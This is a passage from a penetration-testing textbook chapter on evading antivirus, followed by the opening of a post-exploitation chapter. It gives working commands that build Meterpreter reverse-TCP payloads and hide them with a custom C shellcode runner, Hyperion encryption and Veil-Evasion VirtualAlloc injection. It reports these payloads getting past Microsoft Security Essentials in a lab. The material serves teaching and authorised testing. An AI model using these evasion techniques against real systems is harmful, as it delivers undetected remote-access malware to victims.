{
((void (*)())shellcode)();
}
Listing 12-7: Finished custom C file
Now we need to compile the C program. We can’t use the built-in
GCC program because it would compile our program to run on Linux
systems, and we want to run it on a 32-bit Windows system. Instead, we’ll
use the Mingw32 cross compiler from the Kali Linux repositories , which
we installed in Chapter 1. If you haven’t already installed it, install it with
apt-get install mingw32, and then compile your custom C file with i586-min-
gw32msvc-gcc. (Other than the program name, the syntax for using the cross
compiler is the same as for Linux’s built-in GCC, discussed in Chapter 3.)
268 Chapter 12
root@kali:~# i586-mingw32msvc-gcc -o custommeterpreter.exe custommeterpreter.c
Now upload the resulting executable to VirusTotal. As of this writing,
18 antivirus products detected the malicious file. That’s an improvement,
but Microsoft Security Essentials is still catching our file.
We still need to work a little harder to get a malicious executable onto
our Windows 7 system. (You could have better success with this technique
with another cross compiler from another repository.)
Encrypting Executables with Hyperion
Another way to obfuscate our payload is to encrypt it. One executable
encrypter is Hyperion, which uses Advanced Execution Standard (AES)
encryption, a current industry standard. After encrypting the executable,
Hyperion throws away the encryption keys. When the executable runs,
it brute-forces the encryption key to decrypt itself back to the original
executable.
If you have any background in cryptography, this process should raise
a lot of red flags. AES is currently considered a secure encryption standard.
If the executable doesn’t have access to the encryption key, it should not
be able to brute-force the key in any reasonable amount of time, certainly
not fast enough for our program to run in the time window of our pentest.
What’s going on?
As it turns out, Hyperion greatly reduces the possible keyspace for the
encryption key, which means that binaries encrypted with it shouldn’t be
considered cryptographically secure. However, because our goal and the
goal of the Hyperion authors is to obfuscate the code to bypass antivirus
detection, the fact that the key can be brute-forced is not a problem.
Let’s start by using Hyperion to encrypt at simple Meterpreter executable
with no additional antivirus avoidance techniques, as shown in Listing 12-8.
(We installed Hyperion in Chapter 1 on page 21).
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -f exe >
meterpreter.exe
root@kali:~# cd Hyperion-1.0/
root@kali:~/Hyperion-1.0# wine ../hyperion ../meterpreter.exe bypassavhyperion.exeu
Opening ../bypassav.exe
Copied file to memory: 0x117178
--snip--
Executing fasm.exe
flat assembler version 1.69.31
5 passes, 0.4 seconds, 92672 bytes.
Listing 12-8: Running Hyperion
Bypassing Antivirus Applications 269
Hyperion was written to run on Windows systems, but we can run it
on Kali Linux with the Wine program, as you can see in Listing 12-8. Be
sure to change into the Hyperion directory created when you unzipped the
source before running hyperion.exe with Wine.
Hyperion takes two arguments: the name of the file to encrypt and
the name of the encrypted output file. Run Hyperion to encrypt the
simple Meterpreter executable as shown at u. The resulting file is in the
Hyperion 1.0 directory, so upload it to VirusTotal from there.
Using just a Meterpreter executable generated with Msfvenom (with
no encoding, custom templates, or anything else) and encrypting it with
Hyperion resulted in 27 antivirus programs in VirusTotal detecting the
malicious behavior. That’s not our lowest detection rate yet, but we have
finally achieved our goal. As shown in Figure 12-8, Microsoft Security
Essentials did not detect any malicious activity!
Figure 12-8: Microsoft Security Essentials does not detect malware.
Sure enough, we can download and run the Hyperion-encrypted
executable on the Windows 7 system with antivirus protection and get a
Meterpreter session. We haven’t achieved a 0 percent detection rate—the
holy grail for antivirus bypass researchers—but we have been able to meet
our pentest goals.
note To lower our detection rate even more, try combining Hyperion encryption with other
techniques from this section. For example, using Hyperion with a custom template
dropped my detection number down to 14.
Evading Antivirus with Veil-Evasion
Even though we have successfully reached our goal of bypassing Microsoft
Security Essentials on Windows 7, the antivirus landscape changes rapidly,
so it is worthwhile to keep abreast of the latest tools and techniques. Veil-
Evasion is a Python framework that automates creating antivirus-evading
payloads, giving users the choice of multiple techniques. We covered install-
ing Veil-Evasion on Kali Linux in Chapter 1 on page 21; refer back if you
need a refresher.
note As updates are made to Veil-Evasion, your version may be different from what is
shown here.
270 Chapter 12
Python Shellcode Injection with Windows aPIs
Previously we looked at using a custom C template to compile and execute
shellcode. We can do something similar with Python’s Ctypes library, which
gives us access to Windows API function calls and can create C-compatible
data types. We can use Ctypes to access the Windows API VirtualAlloc, which
creates a new executable memory region for the shellcode and locks the
memory region in physical memory, to avoid a page fault as shellcode is cop-
ied in and executed. RtlMoveMemory is used to copy the shellcode bytes into
the memory region created by VirtualAlloc. The CreateThread API creates a
new thread to run the shellcode, and finally, WaitForSingleObject waits until
the created thread is finished and our shellcode has finished running.
These steps collectively are referred to as the VirtualAlloc injection
method. This method, of course, would give us a Python script rather than
a Windows executable, but you can use multiple tools to convert a Python
script into a stand-alone executable.
Creating Encrypted Python-Generated Executables with Veil-Evasion
One of the methods implemented in Veil-Evasion uses the Python injec-
tion technique described earlier. To provide further antivirus protection,
Veil-Evasion can use encryption. For our example, we will use Python
VirtualAlloc injection combined with AES encryption, as we did in the
Hyperion example earlier in this chapter.
To start Veil-Evasion, change directories to Veil-Evasion-master and run
./Veil-Evasion.py. You should be presented with a menu-based prompt similar
to those we saw in SET in the previous chapter, as shown in List ing 12-9.
root@kali:~/Veil-Evasion-master# ./Veil-Evasion.py
========================================================================
Veil-Evasion | [Version]: 2.6.0
========================================================================
[Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
========================================================================
Main Menu
28 payloads loaded
Available commands:
use use a specific payload
info information on a specific payload
list list available payloads
update update Veil to the latest version
clean clean out payload folders
checkvt check payload hashes vs. VirusTotal
exit exit Veil
Listing 12-9: Running Veil
Bypassing Antivirus Applications 271
To see all the available payloads in Veil-Evasion, enter list at the
prompt, as shown in Listing 12-10.
[>] Please enter a command: list
Available payloads:
1) auxiliary/coldwar_wrapper
2) auxiliary/pyinstaller_wrapper
--snip--
22) python/meterpreter/rev_tcp
u23) python/shellcode_inject/aes_encrypt
24) python/shellcode_inject/arc_encrypt
25) python/shellcode_inject/base64_substitution
26) python/shellcode_inject/des_encrypt
27) python/shellcode_inject/flat
28) python/shellcode_inject/letter_substitution
Listing 12-10: Veil-Evasion payloads
As of this writing, there are 28 ways to create executables implemented in
Veil-Evasion. For this example, choose option 23 u to use the VirtualAlloc
injection method and encrypt it with AES encryption. Once you choose a
method, Veil-Evasion will prompt you to change the method options from the
default, if desired, as shown in Listing 12-11.
[>] Please enter a command: 23
Payload: python/shellcode_inject/aes_encrypt loaded
Required Options:
Name Current Value Description
---- ------------- -----------
ucompile_to_exe Y Compile to an executable
expire_paylo X Optional: Payloads expire after "X" days
vinject_method Virtual Virtual, Void, Heap
use_pyherion N Use the pyherion encrypter
Available commands:
set set a specific option value
info show information about the payload
generate generate payload
back go to the main menu
exit exit Veil
Listing 12-11: Using Python VirtualAlloc in Veil-Evasion
272 Chapter 12
By default, this payload will compile the Python script into an execut-
able u using VirtualAlloc() as the injection method v. These options are
correct for our example, so enter generate at the prompt. You are then
prompted for details about the shellcode, as shown in Listing 12-12.
[?] Use msfvenom or supply custom shellcode?
1 - msfvenom (default)
2 - Custom
[>] Please enter the number of your choice: 1
[*] Press [enter] for windows/meterpreter/reverse_tcp
[*] Press [tab] to list available payloads
[>] Please enter metasploit payload:
[>] Enter value for 'LHOST', [tab] for local IP: 192.168.20.9
[>] Enter value for 'LPORT': 2345
[>] Enter extra msfvenom options in OPTION=value syntax:
[*] Generating shellcode...
[*] Press [enter] for 'payload'
[>] Please enter the base name for output files: meterpreterveil
[?] How would you like to create your payload executable?
1 - Pyinstaller (default)
2 - Py2Exe
[>] Please enter the number of your choice: 1
--snip--
[*] Executable written to: /root/veil-output/compiled/meterpreterveil.exe
Language: python
Payload: AESEncrypted
Shellcode: windows/meterpreter/reverse_tcp
Options: LHOST=192.168.20.9 LPORT=2345
Required Options: compile_to_exe=Y inject_method=virtual use_pyherion=N
Payload File: /root/veil-output/source/meterpreterveil.py
Handler File: /root/veil-output/handlers/meterpreterveil_handler.rc
[*] Your payload files have been generated, don't get caught!
[!] And don't submit samples to any online scanner! ;)
Listing 12-12: Generating the executable in Veil-Evasion
Veil-Evasion prompts you to select either Msfvenom to generate
the shellcode or to provide custom shellcode. For our purposes, choose
Msfvenom. The default payload is windows/meterpreter/reverse_tcp, so press
enter to select it. You should be prompted for the usual options, LHOST and
Bypassing Antivirus Applications 273
LPORT, and for a filename for the generated executable. Finally, Veil-Evasion
offers two Python to executable methods. Choose the default, Pyinstaller,
to have Veil-Evasion generate the malicious executable and save it to the
veil-output/compiled directory.
As of this writing, the resulting executable sails right past Microsoft
Security Essentials on our Windows 7 box. Veil-Evasion notes that you
shouldn’t upload the resulting executable to online scanners, so at the
author’s request we’ll forgo checking this example with VirusTotal.
However, we can install other antivirus solutions besides Microsoft
Security Essentials to see if the executable is flagged.
note If you find the Veil-Evasion executables aren’t working, you might need to update
Metasploit with Msfupdate. Since Veil-Evasion is not currently in the Kali Linux
repos, the latest version you pull down when you set up may not match up with how
Msfvenom works in the default Kali 1.0.6 install. Of course, if you update Metasploit
with Msfupdate, other exercises in this book may change, as Metasploit’s functional-
ity changes frequently. Therefore, you may want to save this exercise for a second pass
through the book or use a second Kali Linux image if you don’t want the update to
affect later exercises in the book.
hiding in Plain sight
Perhaps the best way to avoid antivirus programs is to avoid traditional pay-
loads altogether. If you are familiar with coding for Windows, you can use
Windows APIs to mimic the functionality of a payload. There is, of course, no
rule that legitimate applications cannot open a TCP connection to another
system and send data—essentially what our windows/meterpreter/reverse_tcp
payload is doing.
You may find that instead of generating the payload with Msfvenom and
attempting to hide it with the methods covered in this chapter, you get even
better results just writing a C program that performs the payload function-
ality you want. You can even invest in a code-signing certificate to sign your
binary executable, to make it look even more legitimate.
note Turn Real-time protection in Microsoft Security Essentials back off before moving on
to post exploitation.
summary
We’ve looked at only a few techniques for bypassing antivirus detection in
this chapter. The topic of bypassing antivirus solutions could take up an
entire book, and by the time it was published, the book would already be
wildly out of date. Pentesters and researchers are constantly coming up with
new techniques to sneak past antivirus detection, and antivirus vendors are
always adding new signatures and heuristics to catch them.
274 Chapter 12
We looked at ways to use Metasploit to encode and embed payloads
in legitimate executables. When we found that these techniques weren’t
enough to evade Microsoft Security Essentials, we turned to techniques
beyond Metasploit. We built a custom executable template and found that
we were able to improve our results by combining techniques.
We were finally able to reach our goal of bypassing Microsoft Security
Essentials using Hyperion. Though we never reached a 0 percent detection
rate, we were able to bypass Microsoft Security Essentials as well as several
other top antivirus solutions. We also looked at another tool, Veil-Evasion,
which uses VirtualAlloc injection combined with encryption for even better
evasion.
Having looked at a lot of ways to get onto systems, even ones without
readily apparent vulnerabilities, we’ll now turn our attention to what we can
do once we penetrate a system, as we enter the post-exploitation stage of
pentesting.
Bypassing Antivirus Applications 275
13
Post e xPloitation
We’ve gained access to our target systems, so our pen-
etration test is over, right? We can tell our client that
we got a shell on their systems.
But so what? Why would the client care?
In the post-exploitation phase, we will look at information gathering
on the exploited systems, privilege escalation, and moving from system to
system. Perhaps we’ll find that we can access sensitive data stored on the
exploited system or that we have network access to additional systems that
we can use to gain further access to company data. Maybe the exploited
system is part of a domain, and we can use it to access other systems on the
domain. These are just a few of the potential avenues open to us in post
exploitation.
Post exploitation is arguably the most important way to get a clear pic-
ture of a client’s security posture. For example, in Chapter 9, I mentioned a
pentest in which I used access to a decommissioned Windows 2000 domain
controller to gain complete administrative control over a domain. If I hadn’t
used post-exploitation techniques, I might have instead concluded that the
Windows 2000 system stored no sensitive information and that it wasn’t